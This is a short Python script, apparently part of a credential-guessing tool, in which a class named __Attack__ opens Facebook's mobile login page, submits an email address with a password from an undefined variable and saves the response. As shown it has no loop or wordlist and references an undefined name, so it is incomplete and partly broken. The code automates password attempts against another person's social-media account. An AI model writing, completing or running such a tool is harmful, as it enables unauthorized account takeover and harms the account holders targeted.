import os 
import time 
import json 
import threading
import argparse
import mechanize
import agent




class __Attack__:
    def __init__(self,email_id):
        self.email = email_id
    def __start__(self):
        headers = {'User-Agent': agent.myAgent,}
        browser = mechanize.Browser()
        browser.set_handle_equiv(True)
        browser.set_handle_redirect(True)
        browser.set_handle_referer(True)
        browser.set_handle_robots(False)
        browser.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        browser.open('https://free.facebook.com/login.php')
        browser.select_form(nr=0)
        browser.form['email'] = self.email
        browser.form['pass'] = number 
        response_data = browser.submit()
        time.sleep(1)
        res_data = response_data.read()
        res = res_data.decode()
        #print(res)
        f = open("data.html", "w")
        f.write(res)
        f.close()
